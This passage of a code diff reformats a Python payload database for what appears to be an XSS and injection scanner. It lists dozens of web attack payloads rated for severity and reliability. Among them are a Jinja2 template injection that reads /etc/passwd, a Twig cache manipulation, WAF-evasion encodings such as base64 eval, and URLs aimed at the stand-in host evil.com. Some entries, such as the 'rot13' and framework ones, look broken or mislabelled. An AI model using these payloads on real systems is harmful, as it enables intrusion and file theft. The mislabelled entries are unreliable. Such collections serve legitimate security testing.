     "template_twig": PayloadEntry(
-        payload="{{_self.env.setCache(\"opcode.cache\",_self.env.get(\"\\u0000\"))}}",
+        payload='{{_self.env.setCache("opcode.cache",_self.env.get("\\u0000"))}}',
         contexts=["template_injection"],
         severity="critical",
         cvss_score=9.0,
         description="Twig template injection with cache manipulation",
         tags=["twig", "php", "cache"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "template_jinja": PayloadEntry(
         payload="{{request.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}",
         contexts=["template_injection"],
@@ -1025,9 +943,8 @@ PAYLOAD_DATABASE = {
         description="Jinja2 template injection with file read",
         tags=["jinja", "python", "file-read"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # More PostMessage XSS
     "postmessage_origin_bypass": PayloadEntry(
         payload='{"type": "message", "data": "<script>alert(1)</script>"}',
@@ -1037,9 +954,8 @@ PAYLOAD_DATABASE = {
         description="PostMessage with origin bypass",
         tags=["postmessage", "origin", "bypass"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "postmessage_source_injection": PayloadEntry(
         payload='{"source": "javascript:alert(1)", "data": "message"}',
         contexts=["postmessage_xss", "url_context"],
@@ -1048,32 +964,29 @@ PAYLOAD_DATABASE = {
         description="PostMessage source injection",
         tags=["postmessage", "source", "javascript"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # More WASM Context payloads
     "wasm_import_injection": PayloadEntry(
-        payload="(import \"env\" \"alert\" (func $alert))",
+        payload='(import "env" "alert" (func $alert))',
         contexts=["wasm_context"],
         severity="medium",
         cvss_score=6.1,
         description="WebAssembly import injection",
         tags=["wasm", "import", "function"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "wasm_global_injection": PayloadEntry(
-        payload="(global $xss (mut i32) (i32.const 0)) (export \"xss\" (global $xss))",
+        payload='(global $xss (mut i32) (i32.const 0)) (export "xss" (global $xss))',
         contexts=["wasm_context"],
         severity="medium",
         cvss_score=6.1,
         description="WebAssembly global injection",
         tags=["wasm", "global", "export"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # More Markdown Context payloads
     "markdown_link_injection": PayloadEntry(
         payload="[XSS](javascript:alert(1))",
@@ -1083,9 +996,8 @@ PAYLOAD_DATABASE = {
         description="Markdown link injection",
         tags=["markdown", "link", "javascript"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "markdown_image_injection": PayloadEntry(
         payload="![XSS](javascript:alert(1))",
         contexts=["markdown_context"],
@@ -1094,9 +1006,8 @@ PAYLOAD_DATABASE = {
         description="Markdown image injection",
         tags=["markdown", "image", "javascript"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # More XML Context payloads
     "xml_doctype_injection": PayloadEntry(
         payload='<!DOCTYPE root [<!ENTITY xss SYSTEM "javascript:alert(1)">]>',
@@ -1106,9 +1017,8 @@ PAYLOAD_DATABASE = {
         description="XML DOCTYPE entity injection",
         tags=["xml", "doctype", "entity"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "xml_cdata_injection": PayloadEntry(
         payload="<content><![CDATA[<script>alert(1)</script>]]></content>",
         contexts=["xml_content"],
@@ -1117,9 +1027,8 @@ PAYLOAD_DATABASE = {
         description="XML CDATA injection",
         tags=["xml", "cdata", "script"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # Advanced bypass techniques
     "bypass_html5_entities": PayloadEntry(
         payload="&lpar;script&gt;alert(1)&lt;/script&gt;",
@@ -1130,9 +1039,8 @@ PAYLOAD_DATABASE = {
         tags=["encoding", "entity", "html5"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "bypass_css_unicode": PayloadEntry(
         payload="\\00003cscript\\00003ealert(1)\\00003c/script\\00003e",
         contexts=["css_context", "html_content"],
@@ -1142,9 +1050,8 @@ PAYLOAD_DATABASE = {
         tags=["css", "unicode", "encoding"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="high",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "bypass_js_octal": PayloadEntry(
         payload="\\52alert(1)\\52",
         contexts=["javascript_context"],
@@ -1154,9 +1061,8 @@ PAYLOAD_DATABASE = {
         tags=["javascript", "octal", "encoding"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     # More modern web payloads
     "modern_web_components": PayloadEntry(
         payload="<x-script-alert-1></x-script-alert-1>",
@@ -1166,9 +1072,8 @@ PAYLOAD_DATABASE = {
         description="Web Components element name XSS",
         tags=["web-components", "element-name", "modern"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "modern_shadow_root": PayloadEntry(
         payload="<template><script>alert(1)</script></template>",
         contexts=["shadow_dom_xss"],
@@ -1177,9 +1082,8 @@ PAYLOAD_DATABASE = {
         description="Shadow DOM template injection",
         tags=["shadow-dom", "template", "encapsulation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More comprehensive payloads for testing
     "comprehensive_6": PayloadEntry(
         payload="<math><mtext><script>alert(1)</script></mtext></math>",
@@ -1189,9 +1093,8 @@ PAYLOAD_DATABASE = {
         description="MathML element XSS",
         tags=["mathml", "mathematical", "markup"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_7": PayloadEntry(
         payload="<picture><source srcset=x onerror=alert(1)></picture>",
         contexts=["html_content"],
@@ -1200,9 +1103,8 @@ PAYLOAD_DATABASE = {
         description="Picture element XSS",
         tags=["picture", "responsive", "image"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_8": PayloadEntry(
         payload="<dialog open onclose=alert(1)>",
         contexts=["html_content"],
@@ -1211,9 +1113,8 @@ PAYLOAD_DATABASE = {
         description="Dialog element XSS",
         tags=["dialog", "modal", "html5"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_9": PayloadEntry(
         payload="<progress value=1 max=1 onprogress=alert(1)>",
         contexts=["html_content"],
@@ -1222,9 +1123,8 @@ PAYLOAD_DATABASE = {
         description="Progress element XSS",
         tags=["progress", "html5", "onprogress"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "comprehensive_10": PayloadEntry(
         payload="<meter value=1 max=1 onmouseover=alert(1)>",
         contexts=["html_content"],
@@ -1233,9 +1133,8 @@ PAYLOAD_DATABASE = {
         description="Meter element XSS",
         tags=["meter", "html5", "measurement"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     # Advanced encoding and obfuscation
     "obfuscation_base64": PayloadEntry(
         payload="<script>eval(atob('YWxlcnQoMSk='))</script>",
@@ -1246,9 +1145,8 @@ PAYLOAD_DATABASE = {
         tags=["base64", "encoding", "obfuscation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="certain",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "obfuscation_rot13": PayloadEntry(
         payload="<script>nypngr(1)</script>",
         contexts=["html_content"],
@@ -1258,9 +1156,8 @@ PAYLOAD_DATABASE = {
         tags=["rot13", "obfuscation", "encoding"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     "obfuscation_reverse": PayloadEntry(
         payload="<script>trela(1)</script>",
         contexts=["html_content"],
@@ -1270,9 +1167,8 @@ PAYLOAD_DATABASE = {
         tags=["reverse", "obfuscation", "function"],
         browser_support=["chrome", "firefox", "safari", "edge"],
         reliability="medium",
-        waf_evasion=True
+        waf_evasion=True,
     ),
-
     # More protocol attacks
     "protocol_ftp_injection": PayloadEntry(
         payload="ftp://user:pass@evil.com/<script>alert(1)</script>",
@@ -1282,9 +1178,8 @@ PAYLOAD_DATABASE = {
         description="FTP URL injection",
         tags=["ftp", "url", "credentials"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     "protocol_ldap_injection": PayloadEntry(
         payload="ldap://evil.com/dc=<script>alert(1)</script>",
         contexts=["url_context"],
@@ -1293,9 +1188,8 @@ PAYLOAD_DATABASE = {
         description="LDAP URL injection",
         tags=["ldap", "url", "directory"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     # More event handler attacks
     "event_onbeforeunload": PayloadEntry(
         payload="<body onbeforeunload=alert(1)>",
@@ -1305,9 +1199,8 @@ PAYLOAD_DATABASE = {
         description="Beforeunload event XSS",
         tags=["beforeunload", "event", "navigation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "event_onresize": PayloadEntry(
         payload="<div onresize=alert(1)>Resize me</div>",
         contexts=["html_content"],
@@ -1316,9 +1209,8 @@ PAYLOAD_DATABASE = {
         description="Resize event XSS",
         tags=["resize", "event", "window"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     "event_onscroll": PayloadEntry(
         payload="<div onscroll=alert(1) style='height:2000px'>Scroll</div>",
         contexts=["html_content"],
@@ -1327,9 +1219,8 @@ PAYLOAD_DATABASE = {
         description="Scroll event XSS",
         tags=["scroll", "event", "user-interaction"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="low"
+        reliability="low",
     ),
-
     # More form-based attacks
     "form_input_value": PayloadEntry(
         payload="<input value='<script>alert(1)</script>'>",
@@ -1339,9 +1230,8 @@ PAYLOAD_DATABASE = {
         description="Input value XSS",
         tags=["form", "input", "value"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "form_textarea_default": PayloadEntry(
         payload="<textarea><script>alert(1)</script></textarea>",
         contexts=["html_content"],
@@ -1350,9 +1240,8 @@ PAYLOAD_DATABASE = {
         description="Textarea default value XSS",
         tags=["form", "textarea", "default"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # Advanced CSS attacks
     "css_font_face": PayloadEntry(
         payload="@font-face { font-family: 'xss'; src: url('javascript:alert(1)') }",
@@ -1362,9 +1251,8 @@ PAYLOAD_DATABASE = {
         description="CSS font-face injection",
         tags=["css", "font-face", "external"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "css_animation": PayloadEntry(
         payload="@keyframes xss { 0% { } 100% { background: url('javascript:alert(1)') } }",
         contexts=["css_context"],
@@ -1373,9 +1261,8 @@ PAYLOAD_DATABASE = {
         description="CSS animation injection",
         tags=["css", "animation", "keyframes"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More SVG attacks
     "svg_feimage": PayloadEntry(
         payload="<svg><feImage href='javascript:alert(1)'></feImage></svg>",
@@ -1385,9 +1272,8 @@ PAYLOAD_DATABASE = {
         description="SVG feImage filter XSS",
         tags=["svg", "filter", "feimage"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_mask_injection": PayloadEntry(
         payload="<svg><mask><script>alert(1)</script></mask></svg>",
         contexts=["svg_context"],
@@ -1396,9 +1282,8 @@ PAYLOAD_DATABASE = {
         description="SVG mask injection",
         tags=["svg", "mask", "script"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More JavaScript framework attacks
     "framework_react_dangerous": PayloadEntry(
         payload="<div dangerouslySetInnerHTML={{__html: userInput}}>",
@@ -1408,9 +1293,8 @@ PAYLOAD_DATABASE = {
         description="React dangerouslySetInnerHTML XSS",
         tags=["react", "dangerous", "innerHTML"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "framework_vue_vhtml": PayloadEntry(
         payload="<div v-html='userInput'></div>",
         contexts=["template_injection"],
@@ -1419,9 +1303,8 @@ PAYLOAD_DATABASE = {
         description="Vue v-html directive XSS",
         tags=["vue", "v-html", "directive"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "framework_angular_innerhtml": PayloadEntry(
         payload="<div [innerHTML]='userInput'></div>",
         contexts=["template_injection"],
@@ -1430,9 +1313,8 @@ PAYLOAD_DATABASE = {
         description="Angular innerHTML binding XSS",
         tags=["angular", "innerHTML", "binding"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced payloads
     "advanced_1": PayloadEntry(
         payload="<ruby><rt><script>alert(1)</script></rt></ruby>",
@@ -1442,9 +1324,8 @@ PAYLOAD_DATABASE = {
         description="Ruby annotation XSS",
         tags=["ruby", "annotation", "text"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "advanced_2": PayloadEntry(
         payload="<bdi dir=rtl><script>alert(1)</script></bdi>",
         contexts=["html_content"],
@@ -1453,9 +1334,8 @@ PAYLOAD_DATABASE = {
         description="Bidirectional text XSS",
         tags=["bdi", "direction", "rtl"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "advanced_3": PayloadEntry(
         payload="<bdo dir=rtl><script>alert(1)</script></bdo>",
         contexts=["html_content"],
@@ -1464,9 +1344,8 @@ PAYLOAD_DATABASE = {
         description="Bidirectional override XSS",
         tags=["bdo", "direction", "override"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "advanced_4": PayloadEntry(
         payload="<output onforminput=alert(1)>1+1=</output>",
         contexts=["html_content"],
@@ -1475,9 +1354,8 @@ PAYLOAD_DATABASE = {
         description="Output element XSS",
         tags=["output", "form", "calculation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
+        reliability="medium",
     ),
-
     "advanced_5": PayloadEntry(
         payload="<datalist><option value='<script>alert(1)</script>'></datalist>",
         contexts=["html_content"],
@@ -1486,9 +1364,8 @@ PAYLOAD_DATABASE = {
         description="Datalist option XSS",
         tags=["datalist", "form", "option"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More WebSocket specific
     "websocket_json_injection": PayloadEntry(
         payload='{"type": "message", "content": "<script>alert(1)</script>", "timestamp": 1234567890}',
@@ -1498,9 +1375,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket JSON message injection",
         tags=["websocket", "json", "message"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "websocket_room_join": PayloadEntry(
         payload='{"type": "join_room", "room": "<script>alert(1)</script>"}',
         contexts=["websocket_xss"],
@@ -1509,9 +1385,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket room join injection",
         tags=["websocket", "room", "join"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Service Worker specific
     "sw_notification_injection": PayloadEntry(
         payload='{"title": "New Message", "body": "<script>alert(1)</script>"}',
@@ -1521,9 +1396,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker notification injection",
         tags=["service-worker", "notification", "push"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "sw_fetch_intercept": PayloadEntry(
         payload="fetch('/api/user').then(r => r.text()).then(t => { document.body.innerHTML = t; })",
         contexts=["service_worker_xss", "html_content"],
@@ -1532,9 +1406,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker fetch interception XSS",
         tags=["service-worker", "fetch", "intercept"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More WebRTC specific
     "webrtc_ice_candidate": PayloadEntry(
         payload='{"candidate": "candidate:1 1 UDP 2130706431 <script>alert(1)</script> 192.168.1.1 54400 typ host"}',
@@ -1544,9 +1417,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC ICE candidate injection",
         tags=["webrtc", "ice", "candidate"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "webrtc_data_channel_label": PayloadEntry(
         payload='{"type": "channel_create", "label": "<script>alert(1)</script>"}',
         contexts=["webrtc_xss"],
@@ -1555,9 +1427,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC data channel label injection",
         tags=["webrtc", "data-channel", "label"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # More GraphQL specific
     "graphql_fragment_injection": PayloadEntry(
         payload='query { user(id: "123") { ...XSSFragment } } fragment XSSFragment on User { name bio: "<script>alert(1)</script>" }',
@@ -1567,9 +1438,8 @@ PAYLOAD_DATABASE = {
         description="GraphQL fragment injection",
         tags=["graphql", "fragment", "alias"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "graphql_directive_injection": PayloadEntry(
         payload='query { user(id: "123") @include(if: true) { name_<script>alert(1)</script>: name } }',
         contexts=["graphql_xss"],
@@ -1578,9 +1448,8 @@ PAYLOAD_DATABASE = {
         description="GraphQL directive injection",
         tags=["graphql", "directive", "include"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Shadow DOM specific
     "shadow_slot_default": PayloadEntry(
         payload="<my-component><script>alert(1)</script></my-component>",
@@ -1590,9 +1459,8 @@ PAYLOAD_DATABASE = {
         description="Shadow DOM slot default content XSS",
         tags=["shadow-dom", "slot", "default"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "shadow_style_injection": PayloadEntry(
         payload="<style>:host { background: url('javascript:alert(1)') }</style>",
         contexts=["shadow_dom_xss", "css_context"],
@@ -1601,9 +1469,8 @@ PAYLOAD_DATABASE = {
         description="Shadow DOM style injection",
         tags=["shadow-dom", "style", "css"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More iframe sandbox specific
     "iframe_sandbox_data_uri": PayloadEntry(
         payload="<iframe src='data:text/html,<script>alert(1)</script>' sandbox='allow-scripts'></iframe>",
@@ -1613,9 +1480,8 @@ PAYLOAD_DATABASE = {
         description="iframe sandbox data URI bypass",
         tags=["iframe", "sandbox", "data-uri"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     "iframe_sandbox_same_origin": PayloadEntry(
         payload="<iframe src='/same-origin' sandbox='allow-same-origin allow-scripts'></iframe>",
         contexts=["iframe_sandbox_xss"],
@@ -1624,9 +1490,8 @@ PAYLOAD_DATABASE = {
         description="iframe sandbox same-origin bypass",
         tags=["iframe", "sandbox", "same-origin"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="high"
+        reliability="high",
     ),
-
     # Additional comprehensive payloads
     "comprehensive_11": PayloadEntry(
         payload="<rtc><rt><script>alert(1)</script></rt></rtc>",
@@ -1636,9 +1501,8 @@ PAYLOAD_DATABASE = {
         description="Ruby text container XSS",
         tags=["rtc", "ruby", "text"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_12": PayloadEntry(
         payload="<time datetime='<script>alert(1)</script>'>",
         contexts=["html_content"],
@@ -1647,9 +1511,8 @@ PAYLOAD_DATABASE = {
         description="Time element XSS",
         tags=["time", "datetime", "semantic"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_13": PayloadEntry(
         payload="<wbr><script>alert(1)</script>",
         contexts=["html_content"],
@@ -1658,9 +1521,8 @@ PAYLOAD_DATABASE = {
         description="Word break XSS",
         tags=["wbr", "text", "line-break"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_14": PayloadEntry(
         payload="<xmp><script>alert(1)</script></xmp>",
         contexts=["html_content"],
@@ -1669,9 +1531,8 @@ PAYLOAD_DATABASE = {
         description="Example element XSS",
         tags=["xmp", "preformatted", "text"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "comprehensive_15": PayloadEntry(
         payload="<plaintext><script>alert(1)</script>",
         contexts=["html_content"],
@@ -1680,9 +1541,8 @@ PAYLOAD_DATABASE = {
         description="Plaintext element XSS",
         tags=["plaintext", "legacy", "text"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More HTML5 semantic elements
     "html5_article": PayloadEntry(
         payload="<article><script>alert(1)</script></article>",
@@ -1692,9 +1552,8 @@ PAYLOAD_DATABASE = {
         description="Article element XSS",
         tags=["html5", "semantic", "article"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_section": PayloadEntry(
         payload="<section><script>alert(1)</script></section>",
         contexts=["html_content"],
@@ -1703,9 +1562,8 @@ PAYLOAD_DATABASE = {
         description="Section element XSS",
         tags=["html5", "semantic", "section"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_nav": PayloadEntry(
         payload="<nav><script>alert(1)</script></nav>",
         contexts=["html_content"],
@@ -1714,9 +1572,8 @@ PAYLOAD_DATABASE = {
         description="Navigation element XSS",
         tags=["html5", "semantic", "navigation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_main": PayloadEntry(
         payload="<main><script>alert(1)</script></main>",
         contexts=["html_content"],
@@ -1725,9 +1582,8 @@ PAYLOAD_DATABASE = {
         description="Main element XSS",
         tags=["html5", "semantic", "main"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_aside": PayloadEntry(
         payload="<aside><script>alert(1)</script></aside>",
         contexts=["html_content"],
@@ -1736,9 +1592,8 @@ PAYLOAD_DATABASE = {
         description="Aside element XSS",
         tags=["html5", "semantic", "aside"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_header": PayloadEntry(
         payload="<header><script>alert(1)</script></header>",
         contexts=["html_content"],
@@ -1747,9 +1602,8 @@ PAYLOAD_DATABASE = {
         description="Header element XSS",
         tags=["html5", "semantic", "header"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_footer": PayloadEntry(
         payload="<footer><script>alert(1)</script></footer>",
         contexts=["html_content"],
@@ -1758,9 +1612,8 @@ PAYLOAD_DATABASE = {
         description="Footer element XSS",
         tags=["html5", "semantic", "footer"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "html5_address": PayloadEntry(
         payload="<address><script>alert(1)</script></address>",
         contexts=["html_content"],
@@ -1769,9 +1622,8 @@ PAYLOAD_DATABASE = {
         description="Address element XSS",
         tags=["html5", "semantic", "contact"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More advanced SVG attacks
     "svg_use_element": PayloadEntry(
         payload="<svg><use href='#<script>alert(1)</script>'></use></svg>",
@@ -1781,9 +1633,8 @@ PAYLOAD_DATABASE = {
         description="SVG use element XSS",
         tags=["svg", "use", "reference"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_symbol_injection": PayloadEntry(
         payload="<svg><symbol><script>alert(1)</script></symbol></svg>",
         contexts=["svg_context"],
@@ -1792,9 +1643,8 @@ PAYLOAD_DATABASE = {
         description="SVG symbol injection",
         tags=["svg", "symbol", "reusable"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_defs_injection": PayloadEntry(
         payload="<svg><defs><script>alert(1)</script></defs></svg>",
         contexts=["svg_context"],
@@ -1803,9 +1653,8 @@ PAYLOAD_DATABASE = {
         description="SVG defs injection",
         tags=["svg", "defs", "definition"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "svg_g_element": PayloadEntry(
         payload="<svg><g><script>alert(1)</script></g></svg>",
         contexts=["svg_context"],
@@ -1814,9 +1663,8 @@ PAYLOAD_DATABASE = {
         description="SVG group element XSS",
         tags=["svg", "group", "container"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More WebSocket payloads
     "websocket_user_list": PayloadEntry(
         payload='{"type": "user_list", "users": ["<script>alert(1)</script>", "user2"]}',
@@ -1826,9 +1674,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket user list injection",
         tags=["websocket", "user-list", "array"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "websocket_typing_indicator": PayloadEntry(
         payload='{"type": "typing", "user": "<script>alert(1)</script>"}',
         contexts=["websocket_xss"],
@@ -1837,9 +1684,8 @@ PAYLOAD_DATABASE = {
         description="WebSocket typing indicator XSS",
         tags=["websocket", "typing", "indicator"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Service Worker payloads
     "sw_background_sync": PayloadEntry(
         payload='{"type": "sync", "data": "<script>alert(1)</script>"}',
@@ -1849,9 +1695,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker background sync XSS",
         tags=["service-worker", "background-sync", "offline"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "sw_install_event": PayloadEntry(
         payload='{"type": "install", "version": "<script>alert(1)</script>"}',
         contexts=["service_worker_xss"],
@@ -1860,9 +1705,8 @@ PAYLOAD_DATABASE = {
         description="Service Worker install event XSS",
         tags=["service-worker", "install", "lifecycle"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More WebRTC payloads
     "webrtc_sdp_manipulation": PayloadEntry(
         payload='{"type": "offer", "sdp": "v=0\\r\\no=<script>alert(1)</script> 123456"}',
@@ -1872,9 +1716,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC SDP manipulation XSS",
         tags=["webrtc", "sdp", "offer"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "webrtc_peer_info": PayloadEntry(
         payload='{"type": "peer_info", "name": "<script>alert(1)</script>", "id": "peer123"}',
         contexts=["webrtc_xss"],
@@ -1883,9 +1726,8 @@ PAYLOAD_DATABASE = {
         description="WebRTC peer information XSS",
         tags=["webrtc", "peer", "info"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More GraphQL payloads
     "graphql_subscription_xss": PayloadEntry(
         payload='subscription { messageReceived { content: "<script>alert(1)</script>" } }',
@@ -1895,9 +1737,8 @@ PAYLOAD_DATABASE = {
         description="GraphQL subscription XSS",
         tags=["graphql", "subscription", "realtime"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "graphql_introspection_xss": PayloadEntry(
         payload='query { __type(name: "<script>alert(1)</script>") { name } }',
         contexts=["graphql_xss"],
@@ -1906,9 +1747,8 @@ PAYLOAD_DATABASE = {
         description="GraphQL introspection XSS",
         tags=["graphql", "introspection", "schema"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Shadow DOM payloads
     "shadow_custom_property": PayloadEntry(
         payload="<my-element style='--user-content: <script>alert(1)</script>'></my-element>",
@@ -1918,9 +1758,8 @@ PAYLOAD_DATABASE = {
         description="Shadow DOM custom property XSS",
         tags=["shadow-dom", "css", "custom-property"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     "shadow_event_delegation": PayloadEntry(
         payload="<my-component><button onclick='alert(1)'>Click</button></my-component>",
         contexts=["shadow_dom_xss"],
@@ -1929,9 +1768,8 @@ PAYLOAD_DATABASE = {
         description="Shadow DOM event delegation XSS",
         tags=["shadow-dom", "event", "delegation"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="certain"
+        reliability="certain",
     ),
-
     # More Custom Elements payloads
     "ce_lifecycle_connected": PayloadEntry(
         payload="<x-alert-1></x-alert-1>",
@@ -1941,9 +1779,8 @@ PAYLOAD_DATABASE = {
         description="Custom element lifecycle XSS",
         tags=["custom-elements", "lifecycle", "connected"],
         browser_support=["chrome", "firefox", "safari", "edge"],
-        reliability="medium"
